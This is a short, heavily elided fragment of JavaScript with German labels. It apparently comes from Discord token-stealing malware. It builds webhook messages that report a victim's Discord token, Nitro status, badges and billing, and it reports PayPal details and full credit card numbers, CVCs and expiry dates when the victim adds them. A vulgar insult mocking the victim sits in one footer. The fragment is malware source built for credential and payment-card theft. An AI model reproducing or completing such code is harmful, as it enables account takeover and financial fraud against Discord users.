    ...
    embeds: [
      {
        ...
        footer: {
          text: '🎉・YUHU SEINE MUTTER WURDE GEFICKT',
        },
      },
    ],
  };
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '**Paypal Hinzugefügt**',
            value: `Zeit für Nitro :DDD`,
            inline: false,
          },
          {
            name: '**Discord Infos**',
            value: `Nitro Typ: **${nitro}*\nBadges: **${badges}**\nZahlung: **${billing}**`,
            inline: false,
          },
          {
            name: '**Token**',
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '**Kreditkarte Hinzugefügt**',
            value: `CC Nummer: **${number}**\nCVC: **${cvc}**\nAblaufdatum: **${expir_month}/${expir_year}**`,
            inline: true,
          },
          {
            name: '**Discord Infos**',
